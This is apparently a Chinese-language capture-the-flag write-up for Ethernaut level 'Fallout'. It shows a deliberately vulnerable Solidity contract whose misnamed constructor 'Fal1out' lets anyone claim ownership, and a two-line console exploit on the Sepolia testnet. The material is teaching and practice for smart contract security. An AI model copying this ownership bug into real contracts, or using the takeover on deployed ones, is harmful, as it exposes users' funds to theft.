# level2 Fallout

## 1. 问题

要求你修改目标合约owner为你自己的地址

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Fallout {
    using SafeMath for uint256;

    mapping(address => uint256) allocations;
    address payable public owner;

    /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function allocate() public payable {
        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
    }

    function sendAllocation(address payable allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
    }

    function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    function allocatorBalance(address allocator) public view returns (uint256) {
        return allocations[allocator];
    }
}
```

## 2. 解法

这个问题是用户在编写合约时，没有正确编写constructor。
本来用户计划的constructor被错误写成了`Fal1out`，后面切换合约名字，或者第一次编写的时候就没有发现。
另外需要说明的是，为了防止用户出现这个问题，solidity从`0.4.22`之后，就只能使用`constructor(){...}`作为构造函数，不能使用合约的同名函数作为构造函数了。

1. 直接ethernaut里面调用Fal1out, 控制台会唤起metamask[提交交易到sepolia](https://sepolia.etherscan.io/tx/0xbc8f6e10e83031627679c22aa5f18effb9af0d47055c9f79d2e90d7b66cbf741):

```bash
await contract.Fal1out();
```

2. 执行查询，看下owner，发现已经更新了：

```bash
await contract.owner()
```

3. 点击 `submit instance`， 提交通过！